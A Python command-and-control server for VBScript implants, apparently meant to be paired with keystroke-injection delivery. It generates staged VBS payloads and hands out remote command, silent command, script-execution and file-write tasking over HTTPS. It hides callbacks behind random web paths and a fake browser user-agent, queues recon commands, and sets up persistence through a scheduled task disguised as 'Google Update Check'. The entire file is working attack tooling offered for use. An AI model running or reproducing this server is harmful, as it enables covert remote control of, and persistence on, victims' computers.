#!/usr/bin/env python3
import collections, datetime, os, random, re, socket, socketserver, ssl, string, sys, threading, time, uuid

LogBasePath = "C:\\Local\\Path\\To\\VbsServerLogs"
LocalListeningHost = "0.0.0.0"
LocalListeningPort = 443

ListeningServerName = "127.0.0.1"
ListeningServerPort = 443

SslEnabled = True
SslKeyfile="C:\\Local\\Path\\To\\keyfile.key"
SslCertfile="C:\\Local\\Path\\To\\certfile.crt"

ClientUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.1O2 Safari/537.36"

FirstStagePayload = "C:\\Local\\Path\\To\\First-Stage-Payload.vbs"
SecondStagePayload = "C:\\Local\\Path\\To\\Second-Stage-Payload.vbs"

GlobalSecondStageTaskingPath = "C:\\Local\\Path\\To\\Second-Stage-Tasking.txt"
GlobalThirdStageTaskingPath = "C:\\Local\\Path\\To\\Third-Stage-Tasking.txt"
GlobalSecondStageTasking = []
GlobalThirdStageTasking = []

# OpenSSL command to generate a self-signed cert for SSL:
# openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout keyfile.key -out certfile.crt

UUID_Replace_String = "<client_uuid_00000000-0000-0000-0000-000000000000>"
ServerName_Replace_String = "<server_host_name_example.com>"
Port_Replace_String = "<server_port_443>"
SSL_Replace_String = "<SSL_enabled_value_true/false>"
MinWait_Replace_String = "<min_wait_5000>"
MaxWait_Replace_String = "<max_wait_8000>"
HttpPrefix_Replace_String = "<http_prefix>"
HostAndPort_Replace_String = "<host_and_port>"
UriPath_Replace_String = "<registered_uri_path>"
UserAgent_Replace_String = "<client_user_agent>"

# Initial requests are limited to a 1KB size, until the Content-Length header can be found.
InitialRecvBuffer = 1024

# The total request size is limited to 2^28 bytes (268 MB).
MaxRecvSize = 268435456

CurrentTaskingId = 1

# Regular expression for finding the Content-Length header.
ContentLengthRe = re.compile("Content-Length:\s+(?P<ContentLength>\d+)")

# Regular expression for finding the ClientId value.
UuidHeaderRe = re.compile("_user: (?P<ClientId>[a-zA-Z0-9]{8}-([a-zA-Z0-9]{4}-){3}[a-zA-Z0-9]{12})")

# Regular expression for finding the client stage level.
StageHeaderRe = re.compile("_x: (?P<StageLevel>\d+)")

# Regular expression for finding the client's number of attempted callbacks.
CallbackCountRe = re.compile("_y: (?P<CallbackCount>\d+)")

# Regular expression for finding the client user-agent string.
UserAgentRe = re.compile("User-Agent:\s+(?P<UserAgent>.+?)\n")

# Regular expression for finding the requested path value.
UriPathRe = re.compile("(POST|GET) (?P<path>.+?) (HTTP/1\.1)")

TaskingRe = re.compile(r"(?P<Key>[a-zA-Z0-9_]+)\s*=\s*(((?P<quote>['\"])(?P<QuotedStringValue>.*?)(?<!\\)(?P=quote))|(?P<IntegerValue>\d+(\.\d+)?)|(?P<UnQuotedStringValue>[^\s]+))")

# List of Commands to run once the client vbscript calls back.
#InitialTasking = ["CMD ipconfig", "CMD wmic csproduct get UUID", "CMD wmic DISKDRIVE get SerialNumber", "CMD whoami", "CMD whoami /priv", "CMD whoami /groups"]#
InitialTasking = ["CMD CMD=ipconfig"]


TopPaths = []
TopExtensions = []
with open("dirbuster-top1000.txt", "r") as f:
    TopPaths = f.readlines()
with open("randomExtensions.txt", "r") as f:
    TopExtensions = f.readlines()

# Dictionary mapping client ID's to their individual tasking queues
Clients = {}

# Global tasking counter
CurrentTaskingId = 1

# Dictionary mapping URI paths registered to a specific client ID.
RegisteredPaths = {}

ScheduledTaskName = "Google Update Check"

def GetTimestamp():
    return datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
    
def GetDaysFromNow(NumberOfDays=30):
    return (datetime.datetime.utcnow()+datetime.timedelta(days=NumberOfDays)).strftime('%m-%d-%Y')

def GetMinutesFromNow(NumberOfMinutes=5):
    return (datetime.datetime.now()+datetime.timedelta(minutes=NumberOfMinutes)).strftime('%H:%m')

def GetLogLine(LogLine, ClientId = ""):
    if ClientId == "":
        return "{} -- {}".format(GetTimestamp(), LogLine)
    else:
        return "[{}] {} -- {}".format(ClientId, GetTimestamp(), LogLine)

def LogString(LogLine, ClientId = "", DoPrint = True):
    LogFilePath = LogBasePath + "\\" + ClientId + ".log"
    if ClientId == "":
        LogFilePath = LogBasePath + "\\Server.log"
    
    FormattedLogLine = GetLogLine(LogLine, ClientId)
    
    with open(LogFilePath, 'a') as f:
        f.write(FormattedLogLine + "\n")
    
    if DoPrint:
        print(FormattedLogLine)

def GetRandompath():
    pathCandidate = ""
    while pathCandidate in RegisteredPaths or pathCandidate == "":
        pathCandidate = random.choice(TopPaths).strip()
        if "." not in pathCandidate.split("/")[-1]:
            if not pathCandidate.endswith("/"):
                pathCandidate = "{}/".format(pathCandidate)
            pathCandidate = "{}{}.{}".format(pathCandidate, ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=random.randint(1,16))), random.choice(TopExtensions).strip())
    return pathCandidate

def RegisterPath(ClientId, path=""):
    if path == "":
        path = GetRandompath()
    RegisteredPaths[path] = ClientId
    return path
    
def UnregisterPath(path=""):
    if path == "":
        return
    if path in RegisteredPaths:
        del RegisteredPaths[path]
    
class Tasking:
    def __init__(self, command=None, fromstring=None, nextpath=None, raw=False, *args, **kwargs):
        global CurrentTaskingId
        self.command = command
        self.id = CurrentTaskingId
        CurrentTaskingId += 1
        self.kwargs = kwargs
        self.raw = raw
        self.FromString(fromstring)
        self.nextpath = nextpath
    
    def GetString(self):
        returnValue = ""
        if self.raw:
            returnValue = self.command
        else:
            if self.command and len(self.command.strip()) > 0:
                returnValue = "<{}>".format(self.command)
                for (key, value) in self.kwargs.items():
                    returnValue = "{}<{}:{}>".format(returnValue, key, value)
            if self.nextpath:
                returnValue = "<NEXTPATH><PATH:{}>{}".format(self.nextpath, returnValue)
        return returnValue

    def FromString(self, inputstring):
        if not inputstring or len(inputstring.split()) == 0:
            return
        self.command = inputstring.split()[0]
        startIndex = 0
        QuotedValueMatch = TaskingRe.search(inputstring, startIndex)
        while QuotedValueMatch:
            if QuotedValueMatch.group("QuotedStringValue"):
                if QuotedValueMatch.group("QuotedStringValue").endswith("\\ "):
                    self.kwargs[QuotedValueMatch.group("Key")] = QuotedValueMatch.group("QuotedStringValue").rstrip()
                else:
                    self.kwargs[QuotedValueMatch.group("Key")] = QuotedValueMatch.group("QuotedStringValue")
            elif QuotedValueMatch.group("IntegerValue"):
                self.kwargs[QuotedValueMatch.group("Key")] = QuotedValueMatch.group("IntegerValue")
            elif QuotedValueMatch.group("UnQuotedStringValue"):
                self.kwargs[QuotedValueMatch.group("Key")] = QuotedValueMatch.group("UnQuotedStringValue")
            startIndex = QuotedValueMatch.end()
            QuotedValueMatch = TaskingRe.search(inputstring, startIndex)

class Client:
    def __init__(self, id=None, stage=0, initialpath=None):
        global Clients
        self.connections = 0
        self.remote_connection_count = 0
        self.id = id
        if self.id is None:
            self.id = str(uuid.uuid4())
        self.ipaddress = ""
        self.initialpath = initialpath
        if self.initialpath is None:
            self.initialpath = RegisterPath(self.id)
        self.maxwait = 8000
        self.minwait = 5000
        self.port = 0
        self.serveraddress = ListeningServerName
        self.serverport = ListeningServerPort
        self.sslenabled = SslEnabled
        self.stage = stage
        self.tasking = collections.deque([])
        self.sent_tasking = []
        Clients[self.id] = self
        RegisterPath(self.id, self.initialpath)
    
    # Add tasking to the Client's tasking deque. Default action is to append new tasking to the end.
    # Set 'push' to True to append the tasking to the front of the deque.
    def AddTasking(self, task, push=False, path=""):
        if str(type(task)) == "<class 'list'>":
            new_task_list = []
            for i, sub_task in enumerate(task):
                new_task_list.append(Tasking(fromstring=sub_task))
            if push:
                self.tasking.extendleft(new_task_list)
            else:
                self.tasking.extend(new_task_list)
        else:
            if push:
                self.tasking.extendleft([task])
            else:
                self.tasking.extend([task])

    def GetTasking(self):
        # Pop the next command from the tasking queue.
        try:
            CurrentTasking = self.tasking.popleft()
            if not CurrentTasking.nextpath:
                CurrentTasking.nextpath = RegisterPath(self.id)
            return CurrentTasking
        except:
            return Tasking(nextpath=RegisterPath(self.id))

    def GetFirstStage(self):
        Payload = ""
        try:
            with open(FirstStagePayload, "r") as f:
                Payload = f.read()
        except:
            return
        if self.sslenabled:
            Payload = Payload.replace(HttpPrefix_Replace_String, "https")
        else:
            Payload = Payload.replace(HttpPrefix_Replace_String, "http")
        if (self.sslenabled and ListeningServerPort == "443") or (not self.sslenabled and ListeningServerPort == "80"):
            Payload = Payload.replace(HostAndPort_Replace_String, ListeningServerName)
        else:
            Payload = Payload.replace(HostAndPort_Replace_String, "{}:{}".format(ListeningServerName, ListeningServerPort))
        Payload = Payload.replace(UriPath_Replace_String, self.initialpath)
        with open((LogBasePath+"\\first_stage_payload.vbs"), "w") as f:
            f.write(Payload)
        print("[+] Generated first-stage payload: {}".format((LogBasePath+"\\first_stage_payload.vbs")))
        #return Payload
        
    def GetSecondStage(self):
        Payload = ""
        try:
            with open(SecondStagePayload, "r") as f:
                Payload = f.read()
        except:
            return
            
        Payload = Payload.replace(UUID_Replace_String, self.id)
        Payload = Payload.replace(ServerName_Replace_String, ListeningServerName)
        Payload = Payload.replace(Port_Replace_String, str(LocalListeningPort))
        Payload = Payload.replace(MinWait_Replace_String, str(self.minwait))
        Payload = Payload.replace(MaxWait_Replace_String, str(self.maxwait))
        Payload = Payload.replace(UriPath_Replace_String, self.initialpath)
        Payload = Payload.replace(UserAgent_Replace_String, ClientUserAgent)

        if self.sslenabled:
            Payload = Payload.replace(HttpPrefix_Replace_String, "https")
        else:
            Payload = Payload.replace(HttpPrefix_Replace_String, "http")
            
        with open((LogBasePath+"\\second_stage_payload.vbs"), "w") as f:
            f.write(Payload)
        print("[+] Generated second-stage payload: {}".format((LogBasePath+"\\second_stage_payload.vbs")))
        return Payload

    def RegisterCallback(self, path, data=""):
        StageMatch = StageHeaderRe.search(data)
        try:
            if StageMatch:
                self.stage = int(StageMatch.group("StageLevel"))
        except:
            pass
            
        CallbackCountMatch = CallbackCountRe.search(data)
        try:
            if CallbackCountMatch:
                self.remote_connection_count = int(CallbackCountMatch.group("CallbackCount"))
        except:
            pass        
        
        # If the requested callback path is this client's initial callback path, this means the
        # client script has just started and is calling back for the first time, since starting.
        if path.startswith(self.initialpath):
            # It could either be a second-stage client, calling back for its first tasking
            if UuidHeaderRe.search(data) and self.stage <= 2:
                LogString("[+] First connection from second-stage client {}:{}".format(self.ipaddress, self.port), self.id)
                self.stage = 2
                self.AddTasking(GlobalSecondStageTasking)
            # Or a first-stage client, calling back for the second stage.
            elif self.stage == 0:
                LogString("[+] First connection from first-stage client {}:{}".format(self.ipaddress, self.port), self.id)
                self.stage = 1
                self.TaskSecondStage(push=True)
            # Depending on whether or not a client ID was a parameter in the requested URL.
        else:
            UnregisterPath(path.split("?")[0])
            if self.stage == 2:
                LogString("[+] Connection from second-stage client {}:{}".format(self.ipaddress, self.port), self.id)
                if len(self.tasking) == 0:
                    LogString("[!] Tasking deque empty. Tasking install for second-stage client {}:{}...".format(self.ipaddress, self.port), self.id)
                    self.TaskInstall(push=True)
            elif self.stage == 3:
                LogString("[+] Connection from third-stage client {}:{}".format(self.ipaddress, self.port), self.id)
        self.connections += 1
        
    def TaskExit(self, push=False):
        LogString("[!] Tasking remote client termination on [{}]...".format(self.id), "", False)
        LogString("[!] Tasking remote client termination.", self.id)
        self.AddTasking(Tasking(command="EXIT"), push)
    
    def TaskSetUuid(self, uuid="", push=False):
        if uuid != "":
            self.id = uuid
        LogString("[!] Tasking SETUUID on client [{}]...".format(self.id), "", False)
        LogString("[!] Tasking SETUUID on client.", self.id)
        self.AddTasking(Tasking(command="SETUUID", UUID=self.id), push)
    
    def TaskSetCallback(self, interval=8000, range=5000):
        self.minwait = interval - range
        self.maxwait = interval + range
        if self.minwait < 0:
            self.minwait = 0
        if self.maxwait < 0:
            self.maxwait = 0
        if self.maxwait <= self.minwait:
            self.maxwait += 1000
        LogString("[!] Tasking SETCALLBACK({}, {}) on client [{}]...".format(interval, range, self.id), "", False)
        LogString("[!] Tasking SETCALLBACK({}, {}) on client.".format(interval, range), self.id)
        self.AddTasking(Tasking(command="SETCALLBACK", INTERVAL=(((self.maxwait - self.minwait)/2) + self.minwait), RANGE=((self.maxwait - self.minwait)/2)), push)
    
    def TaskSetCallbackHost(self, host="", port="", push=False):
        if host == "":
            host = ListeningServerName
        if port == "":
            port = ListeningServerPort
        LogString("[!] Tasking SETCALLBACKHOST({}, {}) on client [{}]...".format(host, port, self.id), "", False)
        LogString("[!] Tasking SETCALLBACKHOST({}, {}) on client.".format(host, port), self.id)
        self.AddTasking(Tasking(command="SETCALLBACKHOST", HOST=host, PORT=port), push)
        
    def TaskExecVbs(self, vbs="", push=False):
        if vbs == "":
            return
        LogString("[!] Tasking EXECVBS(<{} char>) on client [{}]...".format(len(vbs), self.id), "", False)
        LogString("[!] Tasking EXECVBS(<{} char>) on client.".format(len(vbs)), self.id)
        self.AddTasking(Tasking(command="EXECVBS", VBS=vbs), push)
        
    def TaskWriteFile(self, path="", content="", localpath="", push=False):
        if localpath != "":
            try:
                with open(localpath, "r") as f:
                    content = f.read()
            except:
                pass
        if path == "" or content == "":
            return
        LogString("[!] Tasking WRITEFILE({}, <{} chars>) on client [{}]...".format(path, len(content), self.id), "", False)
        LogString("[!] Tasking WRITEFILE({}, <{} chars>) on client.".format(path, len(content)), self.id)
        self.AddTasking(Tasking(command="WRITEFILE", FILEPATH=path, FILECONTENT=content), push)
    
    def TaskCmd(self, command="", push=False):
        if command == "":
            return
        LogString("[!] Tasking CMD(\"{}...\") on client [{}]...".format(command[0:12], self.id), "", False)
        LogString("[!] Tasking CMD(\"{}...\") on client.".format(command[0:12]), self.id)
        self.AddTasking(Tasking(command="CMD", CMD=command), push)
    
    def TaskSilentCmd(self, command="", push=False):
        if command == "":
            return
        LogString("[!] Tasking SILENTCMD(\"{}...\") on client [{}]...".format(command[0:12], self.id), "", False)
        LogString("[!] Tasking SILENTCMD(\"{}...\") on client.".format(command[0:12]), self.id)
        self.AddTasking(Tasking(command="SILENTCMD", CMD=command), push)
    
    def TaskSecondStage(self, withcheck=False, push=False):
        if self.stage >= 2:
            return
        LogString("[!] Tasking second-stage on client [{}]...".format(self.id), "", False)
        LogString("[!] Tasking second-stage on client.", self.id)
        UnregisterPath(self.initialpath)
        self.initialpath = RegisterPath(self.id)
        commandString = "{}"
        if withcheck:
            commandString = "CC:{}"
        self.AddTasking(Tasking(command=commandString.format(self.GetSecondStage()), raw=True), push)

    def TaskInstall(self, remotepath="", push=False):
        if not remotepath or remotepath == "":
            return
        if push:
            self.AddTasking(Tasking(command="EXIT"), push)
        self.AddTasking(Tasking(command="SILENTCMD", CMD=("SchTasks /Create /SC MINUTE /MO 15 /K /ED {} /Z /F /TN \"{}\" /TR \"{}\" /ST {}".format(GetDaysFromNow(30), ScheduledTaskName, remotepath, GetMinutesFromNow(15)))), push)
        if not push:
            self.AddTasking(Tasking(command="EXIT"), push)


class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
    def handle(self):
        global Clients
        ClientId = ""
        ClientIdFromMatch = None
        ClientIdFromPath = None
        
        # Receive the first 1024 bytes of the initial connection.
        self.data = str(self.request.recv(InitialRecvBuffer), "utf-8")
        SourceAddress, SourcePort = self.request.getpeername()
        
        # If no data was received, do not respond to whatever this connection is.
        if len(self.data) == 0:
            return
        
        UriPathMatch = UriPathRe.search(self.data)
        if not UriPathMatch:
            return
        RequestedPath = UriPathMatch.group("path")
        
        # Get the ClientId from the request path.
        ClientIdMatch = UuidHeaderRe.search(self.data)
        
        if ClientIdMatch:
            ClientIdFromMatch = ClientIdMatch.group("ClientId")
            
        if RequestedPath.split("?")[0] in RegisteredPaths:
            ClientIdFromPath = RegisteredPaths[RequestedPath.split("?")[0]]
        else:
            LogString("[!] Warning: Path not registered for {}:{} at:\n\t{}".format(SourceAddress, SourcePort, RequestedPath), "", True)
            LogString("[!] Warning: Ending connection with {}:{}...".format(SourceAddress, SourcePort), "", True)
            return
        
        if ClientIdFromMatch and ClientIdFromPath and ClientIdFromPath != ClientIdFromMatch:
            LogString("[!] Imposter detected: {}:{} at:\n\t{}".format(SourceAddress, SourcePort, RequestedPath), "", True)
            LogString("[!] Warning: Ending connection with {}:{}...".format(SourceAddress, SourcePort), "", True)
            return
        
        if ClientIdFromMatch and ClientIdFromMatch in Clients:
            ClientId = ClientIdFromMatch
        elif ClientIdFromPath and ClientIdFromPath in Clients:
            ClientId = ClientIdFromPath
        else:
            LogString("[!] Connection from unknown client {}:{} at {}".format(SourceAddress, SourcePort, RequestedPath), "", True)
            LogString("[!] Warning: Ending connection with {}:{}...".format(SourceAddress, SourcePort), "", True)
            return

        CurrentClient = Clients[ClientId]
        
        if CurrentClient.remote_connection_count > 0 and RequestedPath.startswith(CurrentClient.initialpath):
            LogString("[!] Warning: Potential replay detected for {}:{} at:\n\t{}".format(SourceAddress, SourcePort, RequestedPath), "", True)
            LogString("[!] Warning: Ending connection with {}:{}...".format(SourceAddress, SourcePort), "", True)
            return
            
        UserAgentMatch = UserAgentRe.search(self.data)
        
        if CurrentClient.remote_connection_count > 0 and (not UserAgentMatch or UserAgentMatch.group("UserAgent").strip() != ClientUserAgent.strip()):
            LogString("[!] User-Agent does not match expected value for {}:{} at:\n\t{}".format(SourceAddress, SourcePort, RequestedPath), "", True)
            LogString("[!] Warning: Ending connection with {}:{}...".format(SourceAddress, SourcePort), "", True)
            return
        
        CurrentClient.ipaddress = SourceAddress
        CurrentClient.port = SourcePort
        CurrentClient.RegisterCallback(RequestedPath, data=self.data)
        
        LogString("[!] Connection from known client {}:{} => {}".format(SourceAddress, SourcePort, CurrentClient.id), "", False)
        
        # Look for the Content-Length header to figure out how much data to receive.
        ContentLengthMatch = ContentLengthRe.search(self.data)
        
        # If the header was found, consider receiving any unreceived bytes.
        if ContentLengthMatch:
            try:
                # If content-length implies there is more data to receive, though less data than the maximum allowable size, try to receive it.
                if int(ContentLengthMatch.group("ContentLength")) + len(self.data) > InitialRecvBuffer and int(ContentLengthMatch.group("ContentLength")) + len(self.data) <= MaxRecvSize:
                    #LogString("[*] Request Content-Length larger than InitialRecvBuffer - Receiving remaining data...", ClientId)
                    
                    # It may be possible to DoS this server, given the remote host has control over the Content-Length header.
                    # Making requests with large Content-Length header values but small data may lead to resource mismanagement;
                    # Documentation unclear...
                    self.data += str(self.request.recv(int(ContentLengthMatch.group("ContentLength"))), "utf-8")
            except:
                LogString("[-] Unable to find, parse, and validate Content-Length field in request - abandoning connection.", ClientId)
                return
        
        #print(self.data)
        
        # Each GET is a GET for tasking.
        # Each POST is a response to certain tasking.
        if self.data.strip().startswith("GET") or self.data.strip().startswith("POST"):
            CurrentTasking = CurrentClient.GetTasking()
            Command = CurrentTasking.GetString()
            if self.data.strip().startswith("POST"):
                LogString("[+] Received POST from {}:{} at:\n\t{}".format(SourceAddress, SourcePort, RequestedPath), CurrentClient.id, True)
            else:
                LogString("[+] Received GET from {}:{} at:\n\t{}".format(SourceAddress, SourcePort, RequestedPath), CurrentClient.id, True)
            
            # If no Command has been specified, do nothing; this should never happen
            if Command == "":
                return
            try:
                # Send the formatted Command to the client.
                self.request.sendall((b"HTTP/1.1 200\ncontent-length: " + str(len(Command.encode("UTF-8"))).encode("UTF-8") + b"\n\n" + Command.encode("UTF-8")))
                CurrentClient.sent_tasking.append(CurrentTasking)
                LogString("[+] Client picked up tasking [{}].".format(ClientId), "", False)
                LogString("[+] Client picked up tasking.", ClientId)
            except:
                LogString("[!] Encountered exception while tasking client.", ClientId)

            
class ThreadedTcpSslServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    def server_bind(self):
        socketserver.TCPServer.server_bind(self)
        self.socket = ssl.wrap_socket(self.socket, keyfile=SslKeyfile, certfile=SslCertfile, ssl_version=ssl.PROTOCOL_TLS_SERVER, server_side=True, do_handshake_on_connect=False)
    
    def get_request(self):
        (socket, addr) = socketserver.TCPServer.get_request(self)
        socket.do_handshake()
        #print(socket.cipher())
        return (socket, addr)
    pass     

class ThreadedTcpServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    pass

if __name__ == "__main__":
    print("[!] Type 'EXIT' to kill the remote VBS script. Then ctrl+c to shutdown local server.")
    
    # Jackit should call for the instantiation of a client and generation of the first-stage when attacking a device.
    firstStageClient = Client()
    firstStageClient.GetFirstStage()
    
    try:
        if os.path.isfile(GlobalSecondStageTaskingPath):
            with open(GlobalSecondStageTaskingPath, 'r') as f:
                GlobalSecondStageTasking = list(map(lambda x: x.rstrip(), f.readlines()))
    except:
        pass
    try:
        if os.path.isfile(GlobalThirdStageTaskingPath):
            with open(GlobalThirdStageTaskingPath, 'r') as f:
                GlobalThirdStageTasking = list(map(lambda x: x.rstrip(), f.readlines()))
    except:
        pass
    
    # Create a new threaded server.
    if SslEnabled:
        server = ThreadedTcpSslServer((LocalListeningHost, LocalListeningPort), ThreadedTCPRequestHandler)
    else:
        server = ThreadedTcpServer((LocalListeningHost, LocalListeningPort), ThreadedTCPRequestHandler)
        
    ip, port = server.server_address
    
    # Start the server's thread, which will start threads for each new connection.
    server_thread = threading.Thread(target=server.serve_forever)
    
    # Exit the server thread when the main thread terminates.
    server_thread.daemon = True
    server_thread.start()
    
    print("[*] Started server listening on {}:{} ({})".format(ip, port, server_thread.name))
    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            break
        except:
            break

    print("[*] Cleaning up local server...")
    server.shutdown()
    server.server_close()
    print("[+] Done.")
    
    
    
